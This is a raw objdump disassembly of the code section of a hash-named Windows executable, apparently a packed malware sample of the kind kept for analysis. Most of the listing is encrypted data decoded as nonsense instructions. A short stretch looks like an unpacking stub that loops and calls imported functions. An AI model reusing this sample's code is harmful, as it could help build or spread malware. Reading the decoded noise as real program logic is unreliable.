
24389870f7b1489eca96157ca2cf1ddee313034ac70e7334a97f56599bf7ca4d.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	jmp    0x4013b4
  401008:	cwde   
  401009:	jb     0x400fd2
  40100b:	inc    eax
  40100c:	pop    ebp
  40100d:	pop    ebp
  40100e:	cdq    
  40100f:	retf   0xfa9e
  401012:	inc    ebp
  401013:	scas   eax,DWORD PTR es:[edi]
  401014:	inc    ecx
  401015:	cmp    ch,BYTE PTR [eax+0x7e7e7ebb]
  40101b:	jle    0x400f9f
  40101d:	jno    0x40109d
  40101f:	jle    0x400fef
  401021:	(bad)  
  401022:	xor    ecx,ebx
  401024:	xor    eax,0xccddcfdb
  401029:	ja     0x401033
  40102b:	or     ecx,DWORD PTR [esi]
  40102d:	std    
  40102e:	or     al,0xf
  401030:	cmp    ecx,DWORD PTR [edi]
  401032:	int3   
  401033:	adc    al,0x37
  401035:	sbb    al,0x1f
  401037:	mov    ch,0x54
  401039:	or     al,0xa7
  40103b:	ror    DWORD PTR [esi],1
  40103d:	out    dx,eax
  40103e:	mov    cl,0xd3
  401040:	(bad)  
  401041:	or     ecx,DWORD PTR [esi-0x550741ea]
  401047:	dec    ebp
  401048:	sbb    DWORD PTR [ecx+0x561fb6de],esp
  40104e:	loopne 0x4010bf
  401050:	add    ebx,DWORD PTR ds:0x4cc67490
  401056:	mov    ds:0xc8dd215b,al
  40105b:	xor    BYTE PTR [ecx-0x5c368c7e],ah
  401061:	jbe    0x40102b
  401063:	fisttp DWORD PTR [ebp+0x359cc6f5]
  401069:	jecxz  0x4010a7
  40106b:	and    ebp,0x4f
  40106e:	(bad)  
  40106f:	xchg   esi,eax
  401070:	dec    ebp
  401071:	inc    DWORD PTR [edi-0x2d5a886c]
  401077:	mov    cl,0x41
  401079:	loope  0x4010a1
  40107b:	pop    ecx
  40107c:	sub    edi,DWORD PTR [edx-0x4f61911e]
  401082:	jae    0x4010a1
  401084:	retf   
  401085:	call   0xe8ca:0x5ee3d82d
  40108c:	mov    ah,0xfc
  40108e:	loop   0x40102a
  401090:	cmp    eax,0xc76978cf
  401095:	sub    al,0xc1
  401097:	or     dl,ch
  401099:	sbb    eax,0xb39965d
  40109e:	outs   dx,DWORD PTR ds:[esi]
  40109f:	ins    DWORD PTR es:[edi],dx
  4010a0:	je     0x4010a6
  4010a2:	cmp    eax,0x24588ed1
  4010a7:	jns    0x401128
  4010a9:	pop    DWORD PTR ds:[edx]
  4010ac:	shl    DWORD PTR [esi-0x2ea6acfd],cl
  4010b2:	mov    BYTE PTR ds:0x15d550db,0x7d
  4010b9:	sahf   
  4010ba:	mov    dh,0x43
  4010bc:	daa    
  4010bd:	sbb    DWORD PTR [ebx],esp
  4010bf:	addr16 and eax,0x4f3edb12
  4010c5:	in     al,0xc1
  4010c7:	test   al,0x86
  4010c9:	adc    cl,BYTE PTR [edi+ebx*1+0x62]
  4010cd:	bnd jo 0x40105a
  4010d0:	inc    esi
  4010d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4010d2:	arpl   WORD PTR [edx+0x6fd16b53],di
  4010d8:	add    eax,DWORD PTR [edi+0x59d6343a]
  4010de:	xchg   ebx,eax
  4010df:	(bad)  
  4010e0:	cmp    eax,0xa0cb0ca0
  4010e5:	aas    
  4010e6:	jo     0x40115f
  4010e8:	sbb    edx,DWORD PTR [edx]
  4010ea:	lods   al,BYTE PTR ds:[esi]
  4010eb:	push   ss
  4010ec:	mov    bh,0x2d
  4010ee:	(bad)  
  4010ef:	loop   0x401147
  4010f1:	dec    esp
  4010f2:	mov    cl,0x2f
  4010f4:	mov    eax,0xac82b01c
  4010f9:	dec    edi
  4010fa:	or     BYTE PTR [edi-0x7c],cl
  4010fd:	out    0xb,eax
  4010ff:	(bad)  
  401100:	inc    ebx
  401101:	pop    ecx
  401102:	mov    ds:0x828b2fe2,al
  401107:	mov    ebp,0x9f4da888
  40110c:	add    eax,0x143eca5e
  401111:	cmp    eax,0x3017516
  401116:	jmp    0x4010d9
  401118:	push   ecx
  401119:	pop    edx
  40111a:	mov    eax,ds:0x871cc8f7
  40111f:	xor    al,0x6c
  401121:	xchg   esi,eax
  401122:	shl    BYTE PTR [ebp+0x51],1
  401125:	cmc    
  401126:	xchg   ecx,eax
  401127:	ds icebp 
  401129:	lds    esi,FWORD PTR [edi+eax*1+0x5f]
  40112d:	lods   eax,DWORD PTR ds:[esi]
  40112e:	xchg   BYTE PTR [edi-0xc93f678],dh
  401134:	bound  ecx,QWORD PTR [ebx]
  401136:	bound  edi,QWORD PTR [ebx-0x77]
  401139:	cmp    di,WORD PTR [ebx-0xe]
  40113d:	lods   al,BYTE PTR ds:[esi]
  40113e:	adc    edi,DWORD PTR ds:0x825cfd2d
  401144:	out    0xb3,eax
  401146:	adc    al,BYTE PTR [edx+0x7d2c216f]
  40114c:	or     DWORD PTR [edx-0x1f9a50e8],eax
  401152:	dec    edx
  401153:	jb     0x401194
  401155:	fcomi  st,st(1)
  401157:	jbe    0x401163
  401159:	jge    0x4011cb
  40115b:	ret    
  40115c:	jmp    0x1d92:0x5d71e5bb
  401163:	stos   DWORD PTR es:[edi],eax
  401164:	mov    ah,0xa1
  401166:	lock jp 0x40119b
  401169:	in     al,dx
  40116a:	pop    ebp
  40116b:	mov    bl,0x4c
  40116d:	fiadd  WORD PTR [esi-0x15]
  401170:	dec    ecx
  401171:	mov    BYTE PTR [ebx],bl
  401173:	mov    bl,0xb1
  401175:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401176:	pop    ebx
  401177:	cmp    eax,0xb60228f3
  40117c:	mov    ebx,0x498b4643
  401181:	in     eax,dx
  401182:	test   al,0xb2
  401184:	lock sub al,0x7d
  401187:	jb     0x401133
  401189:	cli    
  40118a:	(bad)  
  40118b:	js     0x4011e5
  40118d:	cmp    ebx,ebx
  40118f:	jne    0x401187
  401191:	xchg   DWORD PTR [ebx],eax
  401193:	or     eax,DWORD PTR [esi-0x32c5c5e]
  401199:	ins    DWORD PTR es:[edi],dx
  40119a:	pop    es
  40119b:	stos   BYTE PTR es:[edi],al
  40119c:	add    ebx,DWORD PTR [ebx+0x67]
  40119f:	call   0x7402e456
  4011a4:	test   BYTE PTR [ecx],al
  4011a6:	bound  esi,QWORD PTR [edx]
  4011a8:	sbb    eax,DWORD PTR [edi-0x78e684e5]
  4011ae:	or     esi,ebp
  4011b0:	pop    ss
  4011b1:	idiv   BYTE PTR [edx-0x492f8a70]
  4011b7:	aas    
  4011b8:	dec    esp
  4011b9:	shr    BYTE PTR [edi],0xd
  4011bc:	pop    ecx
  4011bd:	mov    ds:0xb05e197a,al
  4011c2:	push   cs
  4011c3:	hlt    
  4011c4:	mov    esi,0x8488776b
  4011c9:	sbb    edx,ecx
  4011cb:	sbb    eax,0xc813e4ac
  4011d0:	mov    eax,0xe3b5295f
  4011d5:	(bad)  
  4011d6:	shl    DWORD PTR [edi],cl
  4011d8:	jae    0x40115d
  4011da:	mov    cl,0x11
  4011dc:	cmc    
  4011dd:	dec    esp
  4011de:	shr    BYTE PTR [esi],cl
  4011e0:	loopne 0x40122d
  4011e2:	lock jg 0x40125e
  4011e5:	mov    al,ds:0xb010f9b9
  4011ea:	dec    edi
  4011eb:	or     DWORD PTR [edx+0x3c],0xfffffffb
  4011ef:	loopne 0x4011c7
  4011f1:	cmp    DWORD PTR [eax-0x367ffba4],0xcc5377b1
  4011fb:	mov    bh,0x83
  4011fd:	pop    es
  4011fe:	xchg   esp,eax
  4011ff:	daa    
  401200:	ja     0x40127d
  401202:	mov    gs,WORD PTR ds:[eax-0x5c]
  401206:	add    esi,DWORD PTR [ebp-0x5c8b8351]
  40120c:	(bad)  
  40120e:	mov    eax,ds:0x23f4a0bf
  401213:	inc    esi
  401214:	fdiv   QWORD PTR [esi+0x77]
  401217:	jne    0x40125c
  401219:	mov    ebp,0x2f834fa1
  40121e:	and    eax,0xc6247f57
  401223:	outs   dx,BYTE PTR ds:[esi]
  401224:	jo     0x40122c
  401226:	in     eax,dx
  401227:	test   al,0xd6
  401229:	adc    DWORD PTR [eax],0xa53ffa4a
  40122f:	jge    0x401213
  401231:	jge    0x40128f
  401233:	jb     0x401285
  401235:	fsub   st,st(2)
  401237:	cmp    eax,0x9bc0dfc6
  40123c:	jb     0x40124c
  40123e:	test   eax,0xa3b14f90
  401243:	(bad)  [ebx]
  401245:	ss xchg ebp,eax
  401247:	in     eax,dx
  401248:	add    eax,DWORD PTR [edx]
  40124a:	in     al,0x9e
  40124c:	test   BYTE PTR [ebx+0x3b2acfbf],dh
  401252:	ins    DWORD PTR es:[edi],dx
  401253:	inc    eax
  401254:	out    dx,eax
  401255:	clc    
  401256:	rcl    DWORD PTR [ecx+0x35],cl
  401259:	and    al,0x97
  40125b:	outs   dx,BYTE PTR ds:[esi]
  40125c:	jno    0x4012a3
  40125e:	cwde   
  40125f:	and    eax,0xe4b5c40d
  401264:	les    eax,FWORD PTR [esi+0x6f26903e]
  40126a:	xchg   esi,eax
  40126b:	add    eax,0xd2d71cdf
  401270:	pop    bp
  401272:	aaa    
  401273:	adc    BYTE PTR ds:0x222dac0b,0x90
  40127a:	sbb    al,0xd9
  40127c:	cmc    
  40127d:	sbb    al,0xc
  401280:	nop
  401281:	dec    ebx
  401282:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401283:	addr16 sub dh,bl
  401286:	enter  0xb673,0xe5
  40128a:	daa    
  40128b:	push   ss
  40128c:	ins    DWORD PTR es:[edi],dx
  40128d:	sahf   
  40128e:	mov    esi,0x8cdbd24
  401293:	in     al,dx
  401294:	mov    dl,0xe
  401296:	mov    dh,0xf6
  401298:	xlat   BYTE PTR ds:[ebx]
  401299:	nop
  40129a:	stos   DWORD PTR es:[edi],eax
  40129b:	sti    
  40129c:	out    0xdb,eax
  40129e:	mov    bl,0x2f
  4012a0:	repz sbb DWORD PTR [ebx+0x43],esp
  4012a4:	jno    0x4012b6
  4012a6:	lods   eax,DWORD PTR ds:[esi]
  4012a7:	pop    ds
  4012a8:	mov    BYTE PTR [ebp+0x711fcaf2],cl
  4012ae:	jle    0x4012ce
  4012b0:	ficomp WORD PTR [eax]
  4012b2:	add    edx,eax
  4012b4:	gs out 0x3d,al
  4012b7:	jo     0x40123a
  4012b9:	(bad)  
  4012ba:	in     eax,dx
  4012bb:	or     ebx,ecx
  4012bd:	push   ecx
  4012be:	xchg   edi,eax
  4012bf:	mov    ah,0xf0
  4012c1:	jmp    DWORD PTR [eax]
  4012c3:	xor    eax,0xe85c63a6
  4012c8:	sub    dh,BYTE PTR [ebx-0x74]
  4012cb:	pop    ebx
  4012cc:	or     DWORD PTR [eax+ebp*1-0x3a],esp
  4012d0:	(bad)  
  4012d2:	icebp  
  4012d3:	das    
  4012d4:	mov    DWORD PTR [ebp+0x40],eax
  4012d7:	cwde   
  4012d8:	push   es
  4012d9:	or     ah,cl
  4012db:	jae    0x4012fd
  4012dd:	inc    edx
  4012de:	out    dx,al
  4012df:	cmp    al,dh
  4012e1:	or     DWORD PTR [eax-0x5a],eax
  4012e4:	mov    dl,0x5d
  4012e6:	mov    bl,0xb9
  4012e8:	fnstsw WORD PTR [eax-0x4e0e8a4e]
  4012ee:	stos   BYTE PTR es:[edi],al
  4012ef:	sub    al,dl
  4012f1:	sbb    BYTE PTR [esi],al
  4012f3:	scas   al,BYTE PTR es:[edi]
  4012f4:	jns    0x4012f5
  4012f6:	dec    esi
  4012f7:	mov    ebp,ebx
  4012f9:	mov    edx,DWORD PTR [esi]
  4012fb:	dec    dl
  4012fd:	xlat   BYTE PTR ds:[ebx]
  4012fe:	dec    eax
  4012ff:	mov    dl,BYTE PTR [bx+si]
  401302:	fstp   QWORD PTR [esi-0x43]
  401305:	xchg   ecx,eax
  401306:	lock lods al,BYTE PTR cs:[esi]
  401309:	outs   dx,DWORD PTR ds:[esi]
  40130a:	sbb    eax,0x635d7a64
  401310:	popa   
  401311:	test   esp,0xa8a64f47
  401317:	sbb    ecx,DWORD PTR [edx-0x6f2e7eda]
  40131d:	sar    BYTE PTR [eax-0x192b7064],cl
  401323:	mov    eax,ds:0x60e6f779
  401328:	repnz mov ds,WORD PTR [ecx]
  40132b:	test   BYTE PTR ds:0x506d4a01,cl
  401331:	call   0x4295:0x9ab28eb2
  401338:	div    DWORD PTR [ebp+0x42]
  40133b:	xor    eax,0x31a66e2e
  401340:	in     eax,dx
  401341:	adc    edi,edx
  401343:	(bad)  
  401344:	rcl    esi,1
  401346:	(bad)  
  401348:	test   DWORD PTR [edi+esi*8-0x80],ebx
  40134c:	xchg   BYTE PTR [edx],dh
  40134e:	ficom  WORD PTR [ebx-0x3c]
  401351:	and    DWORD PTR [eax+ecx*2],edx
  401354:	sbb    DWORD PTR [ebp+0x5d],esi
  401357:	pop    ds
  401358:	dec    ebx
  401359:	push   ebp
  40135a:	outs   dx,BYTE PTR ds:[esi]
  40135b:	jno    0x4013a7
  40135d:	scas   al,BYTE PTR es:[edi]
  40135e:	jge    0x401379
  401360:	clc    
  401361:	outs   dx,BYTE PTR ds:[esi]
  401362:	inc    edx
  401363:	push   ecx
  401364:	sbb    ecx,DWORD PTR [ebx-0x35583021]
  40136a:	push   eax
  40136b:	retf   
  40136c:	mov    bl,0xf9
  40136e:	push   esp
  40136f:	les    edi,FWORD PTR ds:0x3dd52440
  401375:	cs jle 0x401317
  401378:	inc    ebp
  401379:	popa   
  40137a:	shr    ecx,cl
  40137c:	mov    eax,ds:0x64a8c812
  401381:	fxch   st(2)
  401383:	mov    cl,0x62
  401385:	inc    edi
  401386:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401387:	data16 test BYTE PTR [edi+0x62123ccb],al
  40138e:	fs pop bp
  401391:	pusha  
  401392:	mov    ch,0xde
  401394:	outs   dx,BYTE PTR ds:[esi]
  401395:	or     DWORD PTR [esi-0x4],0xffffffca
  401399:	add    BYTE PTR [ebx-0x7a],0x5d
  40139d:	mov    dh,0xb
  40139f:	out    0xcf,al
  4013a1:	and    dh,BYTE PTR [ebx-0x18dc5e0d]
  4013a7:	mov    WORD PTR [ecx-0x67],?
  4013aa:	jae    0x401388
  4013ac:	dec    edi
  4013ad:	shr    BYTE PTR [edx],0x87
  4013b0:	sub    ah,BYTE PTR [ecx+eiz*4+0x2cec83ac]
  4013b7:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  4013be:	sbb    DWORD PTR ds:0x430486,edi
  4013c4:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  4013cb:	sub    ecx,eax
  4013cd:	mov    eax,0x9507
  4013d2:	mov    WORD PTR [ebp-0x4],ax
  4013d6:	mov    DWORD PTR ds:0x42ee20,0x1f
  4013e0:	cmp    DWORD PTR ds:0x42ee20,0x0
  4013e7:	je     0x40141b
  4013ed:	cmp    DWORD PTR ds:0x42ee20,0x27
  4013f4:	jne    0x401403
  4013fa:	push   DWORD PTR [ebp-0x1c]
  4013fd:	call   DWORD PTR ds:0x42e9ec
  401403:	mov    ecx,DWORD PTR ds:0x42ee20
  401409:	dec    ecx
  40140a:	mov    DWORD PTR ds:0x42ee20,ecx
  401410:	jmp    0x4013e0
  401415:	sub    ecx,DWORD PTR ds:0x42ee24
  40141b:	lea    eax,[ebp-0x24]
  40141e:	mov    DWORD PTR ds:0x430556,0x15
  401428:	cmp    DWORD PTR ds:0x430556,0x0
  40142f:	je     0x401491
  401435:	cmp    DWORD PTR ds:0x430556,0x9
  40143c:	jne    0x40145f
  401442:	push   DWORD PTR [ebp-0x28]
  401445:	push   0x42e7e5
  40144a:	push   0x78ed
  40144f:	push   0x520a
  401454:	push   0x5250
  401459:	call   DWORD PTR ds:0x42e9f0
  40145f:	cmp    DWORD PTR ds:0x430556,0xa
  401466:	jne    0x401479
  40146c:	mov    ecx,DWORD PTR ds:0x430556
  401472:	dec    ecx
  401473:	mov    DWORD PTR ds:0x430556,ecx
  401479:	mov    ecx,DWORD PTR ds:0x430556
  40147f:	dec    ecx
  401480:	mov    DWORD PTR ds:0x430556,ecx
  401486:	jmp    0x401428
  40148b:	and    ecx,DWORD PTR ds:0x43049a
  401491:	mov    DWORD PTR [ebp-0x28],eax
  401494:	and    ecx,ecx
  401496:	mov    eax,DWORD PTR [ebp+0x8]
  401499:	jmp    0x40184a
  40149e:	sub    ch,BYTE PTR [esi+0x5aba4a9e]
  4014a4:	jmp    0x4b50:0xc48b26e
  4014ab:	mov    cl,0x5f
  4014ad:	jmp    0x7182:0x7e7e7182
  4014b4:	jle    0x401534
  4014b6:	jo     0x4014a3
  4014b8:	jmp    0x40149a
  4014ba:	(bad)  
  4014bb:	bound  ebx,QWORD PTR [ebx+eax*2-0x16b9cbf1]
  4014c2:	xchg   ecx,eax
  4014c3:	mov    BYTE PTR [edi-0x5d],ch
  4014c6:	cmp    edx,DWORD PTR [ecx]
  4014c8:	mov    BYTE PTR [edi-0x705ac9c8],bl
  4014ce:	loopne 0x401485
  4014d0:	jmp    0x4014f4
  4014d2:	ror    BYTE PTR [ebp+0x19],0x22
  4014d6:	pop    es
  4014d7:	popf   
  4014d8:	icebp  
  4014d9:	cli    
  4014da:	push   edi
  4014db:	stc    
  4014dc:	and    BYTE PTR [eax-0x3b14905f],ah
  4014e2:	sti    
  4014e3:	pop    ebx
  4014e4:	mov    bl,0xab
  4014e6:	push   ecx
  4014e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4014e9:	xchg   ebx,eax
  4014ea:	inc    ebx
  4014eb:	cmp    al,bh
  4014ed:	fst    QWORD PTR [eax-0x59]
  4014f0:	cmp    eax,0x97459ba1
  4014f5:	xor    al,cl
  4014f7:	xchg   DWORD PTR ds:0xea7649ac,edi
  4014fd:	aam    0x44
  4014ff:	add    BYTE PTR cs:[edx],ch
  401502:	mov    eax,0x34fdcead
  401507:	sub    eax,0xe3d13f07
  40150c:	repnz hlt 
  40150e:	(bad)  
  40150f:	cld    
  401510:	dec    esp
  401511:	into   
  401512:	inc    ebx
  401513:	fild   DWORD PTR [eax]
  401515:	xor    dl,BYTE PTR [esi]
  401517:	in     al,dx
  401518:	add    eax,0xbdc83f77
  40151d:	or     BYTE PTR [eax+0x3d32461b],al
  401523:	scas   al,BYTE PTR es:[edi]
  401524:	sub    BYTE PTR [ebx+esi*1+0x78171444],bh
  40152b:	gs sbb eax,edi
  40152e:	jno    0x4014c1
  401530:	repnz fstp DWORD PTR [edi+0x56]
  401534:	data16 in al,0x7c
  401537:	mov    ds:0x837c431c,al
  40153c:	push   0xffffff91
  40153e:	pushf  
  40153f:	test   eax,0xe89964af
  401544:	lahf   
  401545:	frstor [edi-0x33b9532a]
  40154b:	xchg   DWORD PTR [ebx-0x3e],edx
  40154e:	icebp  
  40154f:	or     dl,BYTE PTR [ecx-0x53]
  401552:	sahf   
  401553:	sbb    al,0xd4
  401555:	or     ah,BYTE PTR [ebx+0x38]
  401558:	push   ss
  401559:	pusha  
  40155a:	(bad)  
  40155b:	push   es
  40155c:	push   ecx
  40155d:	push   eax
  40155e:	xchg   ecx,eax
  40155f:	sar    BYTE PTR [ebx+0x7],0x74
  401563:	or     BYTE PTR [esp+ebx*8+0x4a],bh
  401567:	nop
  401568:	xlat   BYTE PTR ds:[ebx]
  401569:	mov    ah,0x74
  40156b:	iret   
  40156c:	lods   eax,DWORD PTR ds:[esi]
  40156d:	sbb    bh,BYTE PTR [esi-0x4db7db2a]
  401573:	dec    edx
  401574:	gs mov eax,0xb53903c0
  40157a:	sahf   
  40157b:	sbb    al,BYTE PTR [esi-0x20]
  40157e:	test   BYTE PTR [ebx],al
  401580:	ds fcomip st,st(1)
  401583:	adc    eax,0xa45bb971
  401588:	fs mov esi,0xca2de1c1
  40158e:	mov    dh,0xcc
  401590:	inc    ebp
  401591:	or     eax,0xf59caa22
  401596:	scas   eax,DWORD PTR es:[edi]
  401597:	mov    WORD PTR [ebx-0x52f983bf],ds
  40159d:	es aaa 
  40159f:	in     eax,0x52
  4015a1:	xor    DWORD PTR [ecx+ebp*1-0x7f],esi
  4015a5:	fwait
  4015a6:	stos   DWORD PTR es:[edi],eax
  4015a7:	push   esi
  4015a8:	sub    BYTE PTR ds:0xc8d07f54,al
  4015ae:	adc    al,dl
  4015b0:	imul   ch
  4015b2:	ss or  esi,ebp
  4015b5:	or     BYTE PTR [esi+0xbe10d2e],bh
  4015bb:	mov    bh,0x15
  4015bd:	adc    dl,BYTE PTR ds:0x8095d61e
  4015c3:	inc    ebx
  4015c4:	dec    esp
  4015c5:	outs   dx,BYTE PTR ds:[esi]
  4015c6:	xchg   esp,eax
  4015c7:	ss stos BYTE PTR es:[edi],al
  4015c9:	add    eax,0xccb9cdd4
  4015ce:	stos   DWORD PTR es:[edi],eax
  4015cf:	inc    ebx
  4015d0:	out    dx,eax
  4015d1:	int    0x76
  4015d3:	mov    ah,0x41
  4015d5:	inc    eax
  4015d6:	push   ss
  4015d7:	imul   esi,DWORD PTR [esi+0x3aaf2657],0x3b194815
  4015e1:	lds    edi,FWORD PTR [edi]
  4015e3:	mov    esi,0x8a4fd52c
  4015e8:	das    
  4015e9:	sub    DWORD PTR [eax],0xffffffda
  4015ec:	jbe    0x401592
  4015ee:	data16 sahf 
  4015f0:	jle    0x4015d1
  4015f2:	addr16 cmp eax,0xb260879e
  4015f8:	test   BYTE PTR [ecx],dl
  4015fa:	xchg   ebx,eax
  4015fb:	rsm    
  4015fd:	mov    cs,WORD PTR [edx-0x1b]
  401600:	pop    eax
  401601:	mov    WORD PTR [esi+ecx*8],ss
  401604:	dec    eax
  401605:	mov    ds:0x72094fdf,eax
  40160a:	push   cs
  40160b:	add    DWORD PTR [ecx],ecx
  40160d:	or     bl,BYTE PTR [ecx]
  40160f:	dec    ebx
  401610:	fisub  DWORD PTR [ebx+0x58e442d7]
  401616:	imul   ecx,DWORD PTR [edx],0x23
  401619:	dec    esp
  40161a:	outs   dx,BYTE PTR ds:[esi]
  40161b:	es push eax
  40161d:	mov    edx,0xde08cb74
  401622:	or     edx,eax
  401624:	jns    0x401652
  401626:	fidivr WORD PTR [edi+0x22aaa00e]
  40162c:	jae    0x40162a
  40162e:	cs call 0x3eb:0xd748aae8
  401636:	mov    dl,0xe
  401638:	stos   BYTE PTR es:[edi],al
  401639:	push   esi
  40163a:	das    
  40163b:	ss fxch st(7)
  40163e:	scas   eax,DWORD PTR es:[edi]
  40163f:	retf   0xa72e
  401642:	push   edx
  401643:	inc    esp
  401644:	ds aas 
  401646:	aam    0x4b
  401648:	mul    ebp
  40164a:	mov    dl,0xbe
  40164c:	push   cs
  40164d:	and    bh,dh
  40164f:	sbb    al,0xef
  401651:	aad    0x18
  401653:	pop    edx
  401654:	in     eax,dx
  401655:	or     DWORD PTR [esi+0x49],ecx
  401658:	and    eax,0xae70abc6
  40165d:	adc    dl,BYTE PTR [esi+0x72c34644]
  401663:	push   es
  401664:	test   bl,ch
  401666:	mov    dl,0xa0
  401668:	sbb    eax,0xab024b05
  40166d:	push   0x159806d3
  401672:	push   ebx
  401673:	mov    DWORD PTR [esi-0x42],esi
  401676:	es and edx,esi
  401679:	ja     0x4016da
  40167b:	and    al,0xd8
  40167d:	inc    edi
  40167e:	mov    eax,0xd6ad1bec
  401683:	mov    ds:0x9495e10c,al
  401688:	mov    dh,0xe8
  40168a:	jge    0x4016ca
  40168c:	cli    
  40168d:	mov    ebp,0x5eff8190
  401692:	call   0x3a28a983
  401697:	in     eax,dx
  401698:	jle    0x40167a
  40169a:	or     ch,BYTE PTR [ecx]
  40169c:	push   cs
  40169d:	dec    edx
  40169e:	sti    
  40169f:	cdq    
  4016a0:	retf   
  4016a1:	push   ds
  4016a2:	sbb    BYTE PTR [esi-0x24c46ea6],bh
  4016a8:	lea    edi,[eax-0x54]
  4016ab:	imul   edx,DWORD PTR [edx+0x2818a356],0x9458fbc
  4016b5:	adc    al,0x79
  4016b7:	mov    bl,BYTE PTR [eax+0x36]
  4016ba:	fwait
  4016bb:	pop    ss
  4016bc:	adc    ah,BYTE PTR [esi+0xeaa581d]
  4016c2:	mov    edx,0x8a1b5a79
  4016c7:	repz cdq 
  4016c9:	mov    bl,0x71
  4016cb:	popf   
  4016cc:	sbb    DWORD PTR [edi+0x38],edx
  4016cf:	mov    BYTE PTR [ebp+0x17],bh
  4016d2:	iret   
  4016d3:	rol    DWORD PTR [edi],cl
  4016d5:	jecxz  0x401684
  4016d7:	cmp    al,0x7
  4016d9:	mov    esi,0xb61d5057
  4016de:	xchg   edx,eax
  4016df:	dec    ebp
  4016e0:	aaa    
  4016e1:	test   edi,edi
  4016e3:	daa    
  4016e4:	int3   
  4016e5:	pop    ebp
  4016e6:	outs   dx,DWORD PTR ds:[esi]
  4016e7:	(bad)  
  4016e9:	mov    eax,0xa1c3a65a
  4016ee:	ficomp DWORD PTR ds:0x98aa050d
  4016f4:	mov    dl,0xe3
  4016f6:	mov    ah,0x6d
  4016f8:	cmc    
  4016f9:	je     0x401755
  4016fb:	jge    0x40171e
  4016fd:	xor    BYTE PTR [ecx+0x6b26e282],cl
  401703:	imul   ebx,DWORD PTR [ecx-0x4e6a4399],0x871f58af
  40170d:	jae    0x401725
  40170f:	mov    esp,0x39ea1179
  401714:	mov    ds:0x2aec8877,eax
  401719:	js     0x401714
  40171b:	sbb    cl,BYTE PTR [esi-0x7]
  40171e:	cmp    DWORD PTR [ebx-0x14dc48c4],edi
  401724:	dec    ebp
  401725:	aaa    
  401726:	sub    DWORD PTR [eax-0x3f6c27da],edx
  40172c:	lods   eax,DWORD PTR ds:[esi]
  40172d:	aad    0x2e
  40172f:	add    ebp,DWORD PTR [eax]
  401731:	fwait
  401732:	jl     0x401734
  401734:	or     DWORD PTR [eax+0x52],esp
  401737:	cmc    
  401738:	je     0x4016d5
  40173a:	lock dec esi
  40173c:	out    0x99,eax
  40173e:	fcom   DWORD PTR [ecx]
  401740:	cmp    eax,0x6b743d5
  401745:	push   es
  401746:	in     eax,dx
  401747:	(bad)  
  401748:	mov    bh,0x95
  40174a:	stc    
  40174b:	push   ss
  40174c:	mov    al,fs:0xaaf96c55
  401752:	aaa    
  401753:	lea    edx,[ebx-0x73]
  401756:	add    ebp,DWORD PTR [ecx]
  401758:	and    DWORD PTR [ebx-0x57d7604b],edi
  40175e:	popa   
  40175f:	pop    ebp
  401760:	jns    0x4016f7
  401762:	or     BYTE PTR ds:0xdd57134f,bh
  401768:	pop    ebp
  401769:	push   ecx
  40176a:	mov    ebp,0xc26c8012
  40176f:	sub    dl,bl
  401771:	test   eax,0x16837dac
  401776:	out    dx,eax
  401777:	inc    edi
  401778:	ds dec ecx
  40177a:	(bad)  
  40177b:	fild   WORD PTR [edi+0x61dc0e2b]
  401781:	xchg   edx,eax
  401782:	sub    al,0x4d
  401784:	jne    0x4017e4
  401786:	jbe    0x40172c
  401788:	popf   
  401789:	or     eax,0x2b885f9b
  40178e:	loopne 0x401758
  401790:	adc    edx,edi
  401792:	out    dx,al
  401793:	xor    BYTE PTR [eax+0x4d3ced44],bh
  401799:	cmc    
  40179a:	daa    
  40179b:	sbb    bl,BYTE PTR [ecx]
  40179d:	jecxz  0x40180b
  40179f:	mov    ds:0x7e903fd9,eax
  4017a4:	sti    
  4017a5:	mov    ebx,0x2f409b98
  4017aa:	push   edx
  4017ab:	add    esi,DWORD PTR [ecx]
  4017ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017ae:	or     DWORD PTR [ecx],eax
  4017b0:	sahf   
  4017b1:	push   cs
  4017b2:	ss (bad) 
  4017b4:	lods   eax,DWORD PTR ds:[esi]
  4017b5:	xchg   edx,eax
  4017b6:	in     al,dx
  4017b7:	sbb    BYTE PTR [edi-0x3919bdff],bl
  4017bd:	inc    esi
  4017be:	jge    0x401827
  4017c0:	push   esp
  4017c1:	add    ebp,DWORD PTR [eax-0x12542a88]
  4017c7:	inc    ecx
  4017c8:	mov    al,ds:0x2a72abfb
  4017cd:	pop    ss
  4017ce:	stos   BYTE PTR es:[edi],al
  4017cf:	test   al,0x4a
  4017d1:	adc    DWORD PTR [ebx+0x54a29767],0xf2f248f7
  4017db:	dec    edi
  4017dc:	or     ah,bh
  4017de:	cdq    
  4017df:	jle    0x4017a0
  4017e1:	or     al,0x65
  4017e3:	mov    esp,ebp
  4017e5:	cmp    dh,BYTE PTR [edi+0x45]
  4017e8:	push   edx
  4017e9:	shl    DWORD PTR [ecx+0x49],1
  4017ec:	dec    edx
  4017ed:	(bad)  
  4017ee:	sub    bh,BYTE PTR [edi+ebp*8-0x21]
  4017f2:	mov    ecx,0x9a9046c0
  4017f7:	div    BYTE PTR [edx-0x5cc4f59a]
  4017fd:	push   eax
  4017fe:	fld    QWORD PTR [edx]
  401800:	and    ah,BYTE PTR [edi]
  401802:	cmp    DWORD PTR [edi-0x677c2d47],ecx
  401808:	std    
  401809:	arpl   WORD PTR [edx],bp
  40180b:	popf   
  40180c:	or     eax,esi
  40180e:	ins    BYTE PTR es:[edi],dx
  40180f:	sbb    esi,edi
  401811:	jnp    0x40180e
  401813:	test   eax,0xfad2b4f
  401818:	stos   BYTE PTR es:[edi],al
  401819:	xchg   esp,eax
  40181a:	adc    eax,DWORD PTR ss:[eax+0x79a20ee0]
  401821:	jp     0x401886
  401823:	in     eax,dx
  401824:	add    DWORD PTR ds:0xe052d1e9,edi
  40182a:	dec    edx
  40182b:	xchg   DWORD PTR [ebp-0x22],esi
  40182e:	mov    WORD PTR [eax-0x62],gs
  401831:	push   ebp
  401832:	xor    al,0x46
  401834:	addr16 retf 
  401836:	jp     0x4017c5
  401838:	cmp    eax,DWORD PTR [ebx]
  40183a:	dec    ecx
